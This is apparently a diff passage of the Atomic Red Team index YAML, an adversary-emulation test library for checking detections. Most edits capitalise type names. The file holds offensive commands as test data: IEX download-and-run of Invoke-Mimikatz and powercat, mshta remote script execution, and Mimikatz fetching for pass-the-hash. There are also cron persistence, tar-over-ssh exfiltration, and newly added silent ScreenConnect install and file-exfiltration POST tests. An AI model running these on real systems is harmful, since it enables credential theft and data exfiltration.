           default: https://github.com/tevora-threat/SharpView/blob/b60456286b41bb055ee7bc2a14d645410cca9b74/Compiled/SharpView.exe?raw=true
         SharpView:
           description: Path of the executable opensource redteam tool used for the
             performing this atomic.
-          type: path
+          type: Path
           default: PathToAtomicsFolder\T1049\bin\SharpView.exe
         syntax:
           description: Arguements method used along with SharpView to get listing
@@ -54438,7 +55443,7 @@ discovery:
       input_arguments:
         computer_name:
           description: Name of remote computer
-          type: string
+          type: String
           default: localhost
       executor:
         command: |
@@ -54629,7 +55634,7 @@ discovery:
       input_arguments:
         computer_name:
           description: computer name to query
-          type: string
+          type: String
           default: localhost
       executor:
         command: |
@@ -58950,11 +59955,11 @@ execution:
       input_arguments:
         command:
           description: Command to execute
-          type: string
+          type: String
           default: "/tmp/evil.sh"
         tmp_cron:
           description: Temporary reference file to hold evil cron schedule
-          type: path
+          type: Path
           default: "/tmp/persistevil"
       executor:
         name: bash
@@ -58978,11 +59983,11 @@ execution:
       input_arguments:
         command:
           description: Command to execute
-          type: string
+          type: String
           default: echo 'Hello from Atomic Red Team' > /tmp/atomic.log
         cron_script_name:
           description: Name of file to store in cron folder
-          type: string
+          type: String
           default: persistevil
       executor:
         elevation_required: true
@@ -59009,11 +60014,11 @@ execution:
       input_arguments:
         command:
           description: Command to execute
-          type: string
+          type: String
           default: echo 'Hello from Atomic Red Team' > /tmp/atomic.log
         cron_script_name:
           description: Name of file to store in /var/spool/cron/crontabs folder
-          type: string
+          type: String
           default: persistevil
       executor:
         elevation_required: true
@@ -59582,11 +60587,11 @@ execution:
       input_arguments:
         executable_path:
           description: Path of the executable to run.
-          type: path
+          type: Path
           default: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"
         label_name:
           description: Path of the executable to run.
-          type: string
+          type: String
           default: evil
       executor:
         command: 'launchctl submit -l #{label_name} -- #{executable_path}
@@ -59662,15 +60667,15 @@ execution:
       input_arguments:
         script_location:
           description: evil plist location
-          type: path
+          type: Path
           default: "$PathToAtomicsFolder/T1053.004/src/atomicredteam_T1053_004.plist"
         script_destination:
           description: Path where to move the evil plist
-          type: path
+          type: Path
           default: "/etc/emond.d/rules/atomicredteam_T1053_004.plist"
         empty_file:
           description: Random name of the empty file used to trigger emond service
-          type: string
+          type: String
           default: randomflag
       executor:
         name: bash
@@ -60055,7 +61060,7 @@ execution:
       input_arguments:
         pua_url:
           description: url to PotentiallyUnwanted.exe
-          type: url
+          type: Url
           default: http://amtso.eicar.org/PotentiallyUnwanted.exe
         pua_file:
           description: path to PotentiallyUnwanted.exe
@@ -60092,8 +61097,8 @@ execution:
             that will host the file_name in the c2_parent_directory.
 
 '
-          type: url
-          default: "$false"
+          type: Url
+          default: 
         c2_parent_directory:
           description: |
             Parent directory where you have the "malicious" file on c2_domain server.
@@ -60500,7 +61505,7 @@ execution:
       input_arguments:
         mimurl:
           description: Mimikatz url
-          type: url
+          type: Url
           default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
       executor:
         command: 'powershell.exe "IEX (New-Object Net.WebClient).DownloadString(''#{mimurl}'');
@@ -60628,7 +61633,7 @@ execution:
       input_arguments:
         url:
           description: url of payload to execute
-          type: url
+          type: Url
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1
       executor:
         command: 'powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject
@@ -60648,7 +61653,7 @@ execution:
       input_arguments:
         url:
           description: url of payload to execute
-          type: url
+          type: Url
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml
       executor:
         command: '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec
@@ -60668,7 +61673,7 @@ execution:
       input_arguments:
         url:
           description: url of payload to execute
-          type: url
+          type: Url
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct
       executor:
         command: 'C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject(''script:#{url}'').Exec();close()"
@@ -60939,7 +61944,7 @@ execution:
       input_arguments:
         obfuscated_code:
           description: 'Defaults to: Invoke-Expression with a "Write-Host" line.'
-          type: string
+          type: String
           default: JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
       executor:
         command: 'powershell.exe -e  #{obfuscated_code}
@@ -60970,7 +61975,7 @@ execution:
       executor:
         name: powershell
         elevation_required: true
-        command: |-
+        command: |
           $malcmdlets = #{Malicious_cmdlets}
           foreach ($cmdlets in $malcmdlets) {
               "function $cmdlets { Write-Host Pretending to invoke $cmdlets }"}
@@ -61285,7 +62290,7 @@ execution:
         time:
           description: What time 24 Hour
           type: String
-          default: 72600
+          default: '20:10'
       executor:
         name: command_prompt
         elevation_required: false
@@ -61311,7 +62316,7 @@ execution:
         time:
           description: What time 24 Hour
           type: String
-          default: 72600
+          default: '20:10'
         target:
           description: Target
           type: String
@@ -61609,11 +62614,11 @@ execution:
       input_arguments:
         service_name:
           description: Name of service to create
-          type: string
+          type: String
           default: ARTService
         executable_command:
           description: Command to execute as a service
-          type: string
+          type: String
           default: "%COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType
             File C:\\art-marker.txt"
       executor:
@@ -61638,7 +62643,7 @@ execution:
       input_arguments:
         remote_host:
           description: Remote hostname or IP address
-          type: string
+          type: String
           default: localhost
         user_name:
           description: Username
@@ -61650,7 +62655,7 @@ execution:
           default: P@ssw0rd1
         psexec_exe:
           description: Path to PsExec
-          type: string
+          type: String
           default: C:\PSTools\PsExec.exe
       dependency_executor_name: powershell
       dependencies:
@@ -62102,7 +63107,7 @@ execution:
       input_arguments:
         script_path:
           description: Script path
-          type: path
+          type: Path
           default: "/tmp/art.sh"
       executor:
         command: |
@@ -62402,11 +63407,11 @@ execution:
       input_arguments:
         command_to_execute:
           description: Command to execute within script.
-          type: string
+          type: String
           default: dir
         script_path:
           description: Script path.
-          type: path
+          type: Path
           default: "$env:TEMP\\T1059.003_script.bat"
       dependency_executor_name: powershell
       dependencies:
@@ -62438,11 +63443,11 @@ execution:
       input_arguments:
         file_contents_path:
           description: Path to the file that the command prompt will drop.
-          type: path
+          type: Path
           default: "%TEMP%\\test.bin"
         message:
           description: Message that will be written to disk and then displayed.
-          type: string
+          type: String
           default: Hello from the Windows Command Prompt!
       executor:
         command: 'echo "#{message}" > "#{file_contents_path}" & type "#{file_contents_path}"
@@ -62463,11 +63468,11 @@ execution:
       input_arguments:
         output_file:
           description: File to output to
-          type: string
+          type: String
           default: hello.txt
         input_message:
           description: Message to write to file
-          type: string
+          type: String
           default: Hello, from CMD!
       executor:
         command: "%LOCALAPPDATA:~-3,1%md /c echo #{input_message} > #{output_file}
@@ -62976,7 +63981,7 @@ lateral-movement:
       input_arguments:
         computer_name:
           description: Name of Computer
-          type: string
+          type: String
           default: localhost
       executor:
         command: '[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe",
@@ -63216,15 +64221,15 @@ lateral-movement:
       input_arguments:
         user_name:
           description: username
-          type: string
+          type: String
           default: Administrator
         ntlm:
           description: ntlm hash
-          type: string
+          type: String
           default: cc36cf7a8514893efccd3324464tkg1a
         domain:
           description: domain
-          type: string
+          type: String
           default: atomic.local
         mimikatz_path:
           description: mimikatz windows executable
@@ -63241,7 +64246,8 @@ lateral-movement:
           if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210724/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
@@ -63261,7 +64267,7 @@ lateral-movement:
       input_arguments:
         user_name:
           description: username
-          type: string
+          type: String
           default: Administrator
         crackmapexec_exe:
           description: crackmapexec windows executable
@@ -63269,15 +64275,15 @@ lateral-movement:
           default: C:\CrackMapExecWin\crackmapexec.exe
         command:
           description: command to execute
-          type: string
+          type: String
           default: whoami
         ntlm:
           description: command
-          type: string
+          type: String
           default: cc36cf7a8514893efccd3324464tkg1a
         domain:
           description: domain
-          type: string
+          type: String
           default: atomic.local
       dependency_executor_name: powershell
       dependencies:
@@ -63380,15 +64386,15 @@ lateral-movement:
       input_arguments:
         user_name:
           description: username
-          type: string
+          type: String
           default: Administrator
         domain:
           description: domain
-          type: string
+          type: String
           default: atomic.local
         mimikatz_exe:
           description: Path of the Mimikatz binary
-          type: string
+          type: Path
           default: PathToAtomicsFolder\T1550.003\bin\mimikatz.exe
       dependency_executor_name: powershell
       dependencies:
@@ -63400,7 +64406,8 @@ lateral-movement:
 '
         get_prereq_command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\Mimi.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\Mimi.zip"
           Expand-Archive $env:TEMP\Mimi.zip $env:TEMP\Mimi -Force
           New-Item -ItemType Directory (Split-Path #{mimikatz_exe}) -Force | Out-Null
           Copy-Item $env:TEMP\Mimi\x64\mimikatz.exe #{mimikatz_exe} -Force
@@ -64558,15 +65565,15 @@ lateral-movement:
       input_arguments:
         user_name:
           description: Username
-          type: string
+          type: String
           default: Domain\Administrator
         destination_address:
           description: Remote Host IP or Hostname
-          type: string
+          type: String
           default: Target
         password:
           description: Password
-          type: string
+          type: String
           default: P@ssw0rd1
       dependency_executor_name: powershell
       dependencies:
@@ -64888,19 +65895,19 @@ command-and-control:
       input_arguments:
         query_type:
           description: DNS query type
-          type: string
+          type: String
           default: TXT
         subdomain:
           description: Subdomain prepended to the domain name
-          type: string
+          type: String
           default: atomicredteam
         query_volume:
           description: Number of DNS queries to send
-          type: integer
-          default: '1000'
+          type: Integer
+          default: 1000
         domain:
           description: Default domain to simulate against
-          type: string
+          type: String
           default: 127.0.0.1.xip.io
       executor:
         command: 'for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type
@@ -64920,29 +65927,29 @@ command-and-control:
       input_arguments:
         runtime:
           description: Time in minutes to run the simulation
-          type: integer
-          default: '30'
+          type: Integer
+          default: 30
         domain:
           description: Default domain to simulate against
-          type: string
+          type: String
           default: 127.0.0.1.xip.io
         subdomain:
           description: Subdomain prepended to the domain name
-          type: string
+          type: String
           default: atomicredteam
         query_type:
           description: DNS query type
-          type: string
+          type: String
           default: TXT
         c2_interval:
           description: Seconds between C2 requests to the command and control server
-          type: integer
-          default: '30'
+          type: Integer
+          default: 30
         c2_jitter:
           description: Percentage of jitter to add to the C2 interval to create variance
             in the times between C2 requests
-          type: integer
-          default: '20'
+          type: Integer
+          default: 20
       executor:
         command: |
           Set-Location PathToAtomicsFolder
@@ -64959,16 +65966,16 @@ command-and-control:
       input_arguments:
         query_type:
           description: DNS query type
-          type: string
+          type: String
           default: TXT
         subdomain:
           description: Subdomain prepended to the domain name (should be 63 characters
             to test maximum length)
-          type: string
+          type: String
           default: atomicredteamatomicredteamatomicredteamatomicredteamatomicredte
         domain:
           description: Default domain to simulate against
-          type: string
+          type: String
           default: 127.0.0.1.xip.io
       executor:
         command: |
@@ -64990,11 +65997,11 @@ command-and-control:
         domain:
           description: Domain Name configured to use DNS Server where your C2 listener
             is running
-          type: string
+          type: String
           default: example.com
         server_ip:
           description: IP address of DNS server where your C2 listener is running
-          type: string
+          type: String
           default: 127.0.0.1
       executor:
         command: |
@@ -66038,11 +67045,11 @@ command-and-control:
       input_arguments:
         remote_file:
           description: URL of file to download
-          type: url
+          type: Url
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
         local_path:
           description: Location to save downloaded file
-          type: path
+          type: Path
           default: "%temp%\\Atomic-license.txt"
       dependency_executor_name: powershell
       dependencies:
@@ -66124,11 +67131,11 @@ command-and-control:
       input_arguments:
         target_remote_file:
           description: File to download
-          type: string
+          type: Url
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt
         output_file:
           description: File to write to
-          type: string
+          type: String
           default: LICENSE.txt
       executor:
         command: "(New-Object Net.WebClient).DownloadString('#{target_remote_file}')
@@ -66212,11 +67219,11 @@ command-and-control:
       input_arguments:
         proxy_server:
           description: Proxy server URL (host:port)
-          type: url
+          type: Url
           default: 127.0.0.1:8080
         proxy_scheme:
           description: Protocol to proxy (http or https)
-          type: string
+          type: String
           default: http
       executor:
         command: 'export #{proxy_scheme}_proxy=#{proxy_server}
@@ -66238,15 +67245,15 @@ command-and-control:
       input_arguments:
         proxy_server:
           description: Proxy server URL (host)
-          type: string
+          type: Url
           default: 127.0.0.1
         proxy_port:
           description: Proxy server port
-          type: string
+          type: Integer
           default: 8080
         interface:
           description: Protocol to proxy (http or https)
-          type: string
+          type: String
           default: Wi-Fi
       executor:
         name: sh
@@ -66268,18 +67275,18 @@ command-and-control:
           description: Specifies the IPv4 address to which to connect. Acceptable
             values are IP address, computer NetBIOS name, or computer DNS name. If
             an address is not specified, the default is the local computer.
-          type: string
+          type: String
           default: 127.0.0.1
         connectport:
           description: Specifies the IPv4 port, by port number or service name, to
             which to connect. If connectport is not specified, the default is the
             value of listenport on the local computer.
-          type: string
+          type: String
           default: '1337'
         listenport:
           description: Specifies the IPv4 port, by port number or service name, on
             which to listen.
-          type: string
+          type: String
           default: '1337'
       executor:
         command: netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport}
@@ -66576,7 +67583,7 @@ command-and-control:
       input_arguments:
         server_ip:
           description: The IP address of the listening server
-          type: string
+          type: String
           default: 127.0.0.1
       executor:
         command: |
@@ -66592,19 +67599,19 @@ command-and-control:
       input_arguments:
         server_port:
           description: The port for the C2 connection
-          type: integer
-          default: '80'
+          type: Integer
+          default: 80
         ncat_exe:
           description: The location of ncat.exe
-          type: path
+          type: Path
           default: "$env:TEMP\\T1095\\nmap-7.80\\ncat.exe"
         ncat_path:
           description: The folder path of ncat.exe
-          type: path
+          type: Path
           default: "$env:TEMP\\T1095"
         server_ip:
           description: The IP address or domain name of the listening server
-          type: string
+          type: String
           default: 127.0.0.1
       dependency_executor_name: powershell
       dependencies:
@@ -66638,12 +67645,12 @@ command-and-control:
       input_arguments:
         server_ip:
           description: The IP address or domain name of the listening server
-          type: string
+          type: String
           default: 127.0.0.1
         server_port:
           description: The port for the C2 connection
-          type: integer
-          default: '80'
+          type: Integer
+          default: 80
       executor:
         command: |
           IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')
@@ -67017,23 +68024,23 @@ command-and-control:
       input_arguments:
         doh_server:
           description: Default DoH resolver
-          type: string
+          type: String
           default: https://8.8.8.8/resolve
         query_type:
           description: DNS query type
-          type: string
+          type: String
           default: TXT
         subdomain:
           description: Subdomain prepended to the domain name
-          type: string
+          type: String
           default: atomicredteam
         query_volume:
           description: Number of DNS queries to send
-          type: integer
+          type: Integer
           default: '1000'
         domain:
           description: Default domain to simulate against
-          type: string
+          type: String
           default: 127.0.0.1.xip.io
       executor:
         command: 'for($i=0; $i -le #{query_volume}; $i++) { (Invoke-WebRequest "#{doh_server}?name=#{subdomain}.$(Get-Random
@@ -67053,33 +68060,33 @@ command-and-control:
       input_arguments:
         doh_server:
           description: Default DoH resolver
-          type: string
+          type: String
           default: https://8.8.8.8/resolve
         runtime:
           description: Time in minutes to run the simulation
-          type: integer
-          default: '30'
+          type: Integer
+          default: 30
         domain:
           description: Default domain to simulate against
-          type: string
+          type: String
           default: 127.0.0.1.xip.io
         subdomain:
           description: Subdomain prepended to the domain name
-          type: string
+          type: String
           default: atomicredteam
         query_type:
           description: DNS query type
-          type: string
+          type: String
           default: TXT
         c2_interval:
           description: Seconds between C2 requests to the command and control server
-          type: integer
-          default: '30'
+          type: Integer
+          default: 30
         c2_jitter:
           description: Percentage of jitter to add to the C2 interval to create variance
             in the times between C2 requests
-          type: integer
-          default: '20'
+          type: Integer
+          default: 20
       executor:
         command: |
           Set-Location PathToAtomicsFolder
@@ -67096,20 +68103,20 @@ command-and-control:
       input_arguments:
         doh_server:
           description: Default DoH resolver
-          type: string
+          type: String
           default: https://8.8.8.8/resolve
         query_type:
           description: DNS query type
-          type: string
+          type: String
           default: TXT
         subdomain:
           description: Subdomain prepended to the domain name (should be 63 characters
             to test maximum length)
-          type: string
+          type: String
           default: atomicredteamatomicredteamatomicredteamatomicredteamatomicredte
         domain:
           description: Default domain to simulate against
-          type: string
+          type: String
           default: 127.0.0.1.xip.io
       executor:
         command: |
@@ -67302,6 +68309,22 @@ command-and-control:
         cleanup_command: try{$PathToAtomicsFolder/T1219/Bin/GoToCleanup.ps1} catch{}
         name: powershell
         elevation_required: true
+    - name: ScreenConnect Application Download and Install on Windows
+      auto_generated_guid: 4a18cc4e-416f-4966-9a9d-75731c4684c0
+      description: |
+        An adversary may attempt to trick the user into downloading ScreenConnect for use as a C2 channel. Download of ScreenConnect installer will be in the Downloads directory.
+        Msiexec will be used to quietly insall ScreenConnect.
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          $installer = "C:\Users\$env:username\Downloads\ScreenConnect.msi"
+          Invoke-WebRequest -OutFile $installer "https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_21.11.4237.7885_Release.msi"
+          msiexec /i $installer /qn
+        cleanup_command: $installer = "C:\Users\$env:username\Downloads\ScreenConnect.msi"
+          msiexec /x $installer /qn
+        name: powershell
+        elevation_required: true
   T1132.001:
     technique:
       external_references:
@@ -67367,11 +68390,11 @@ command-and-control:
       input_arguments:
         destination_url:
           description: Destination URL to post encoded data.
-          type: string
+          type: Url
           default: redcanary.com
         base64_data:
           description: Encoded data to post using fake Social Security number 111-11-1111.
-          type: string
+          type: String
           default: MTExLTExLTExMTE=
       executor:
         command: |
@@ -67388,15 +68411,15 @@ command-and-control:
       input_arguments:
         destination_url:
           description: Destination URL to post encoded data.
-          type: string
+          type: Url
           default: example.com
         plaintext:
           description: Plain text mimicking victim data sent to C2 server.
-          type: string
+          type: String
           default: Path\n----\nC:\Users\victim
         key:
           description: XOR key used for encoding the plaintext.
-          type: string
+          type: String
           default: abcdefghijklmnopqrstuvwxyz123456
       executor:
         command: |
@@ -67635,7 +68658,7 @@ command-and-control:
       input_arguments:
         domain:
           description: Default domain to simulate against
-          type: string
+          type: String
           default: www.google.com
       executor:
         command: |
@@ -67655,11 +68678,11 @@ command-and-control:
       input_arguments:
         domain:
           description: Default domain to simulate against
-          type: string
+          type: String
           default: www.google.com
         curl_path:
           description: path to curl.exe
-          type: path
+          type: Path
           default: C:\Windows\System32\Curl.exe
       dependency_executor_name: powershell
       dependencies:
@@ -67691,7 +68714,7 @@ command-and-control:
       input_arguments:
         domain:
           description: Default domain to simulate against
-          type: string
+          type: String
           default: www.google.com
       executor:
         command: |
@@ -67809,7 +68832,7 @@ exfiltration:
           default: C:\temp\T1020_exfilFile.txt
         domain:
           description: Destination Domain
-          type: url
+          type: Url
           default: https://google.com
       executor:
         command: |-
@@ -67977,7 +69000,7 @@ exfiltration:
       input_arguments:
         domain:
           description: target SSH domain
-          type: url
+          type: Url
           default: target.example.com
       executor:
         command: 'ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
@@ -67998,15 +69021,15 @@ exfiltration:
       input_arguments:
         user_name:
           description: username for domain
-          type: string
+          type: String
           default: atomic
         password:
           description: password for user
-          type: string
+          type: String
           default: atomic
         domain:
           description: target SSH domain
-          type: url
+          type: Url
           default: target.example.com
       executor:
         command: 'tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh
@@ -68148,7 +69171,43 @@ exfiltration:
       - 'Command: Command Execution'
       x_mitre_version: '2.0'
       x_mitre_is_subtechnique: false
-    atomic_tests: []
+      identifier: T1041
+    atomic_tests:
+    - name: C2 Data Exfiltration
+      auto_generated_guid: d1253f6e-c29b-49dc-b466-2147a6191932
+      description: 'Exfiltrates a file present on the victim machine to the C2 server.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        destination_url:
+          description: Destination URL to post encoded data.
+          type: String
+          default: example.com
+        filepath:
+          description: The file which is being exfiltrated to the C2 Server.
+          type: Path
+          default: C:\Users\$env:UserName\LineNumbers.txt
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'The file to be exfiltrated must be present on the machine. Running
+          the pre-reqs will create a sample file to be exfiltrated, else give the
+          path of already present file as input.
+
+'
+        prereq_command: 'if ([System.IO.File]::Exists("#{filepath}")){exit 0} else
+          {exit 1}
+
+'
+        get_prereq_command: "echo \"Creating file to be exfiltrated\" \n1..100 | ForEach-Object
+          { Add-Content -Path #{filepath} -Value \"This is line $_.\" }\n"
+      executor:
+        command: |
+          [System.Net.ServicePointManager]::Expect100Continue = $false
+          $filecontent = Get-Content -Path #{filepath}
+          Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive
+        name: powershell
   T1011:
     technique:
       id: attack-pattern--51ea26b1-ff1e-4faa-b1a0-1114cd298c87
@@ -69377,7 +70436,7 @@ initial-access:
       input_arguments:
         chrome_url:
           description: chrome installer download URL
-          type: url
+          type: Url
           default: https://dl.google.com/tag/s/appguid%3D%7B8A69D345-D564-463C-AFF1-A69D9E530F96%7D%26iid%3D%7BFD62DDBC-14C6-20BD-706F-C7744738E422%7D%26lang%3Den%26browser%3D3%26usagestats%3D0%26appname%3DGoogle%2520Chrome%26needsadmin%3Dprefers%26ap%3Dx64-stable-statsdef_1%26installdataindex%3Dempty/chrome/install/ChromeStandaloneSetup64.exe
         extension_id:
           description: chrome extension id
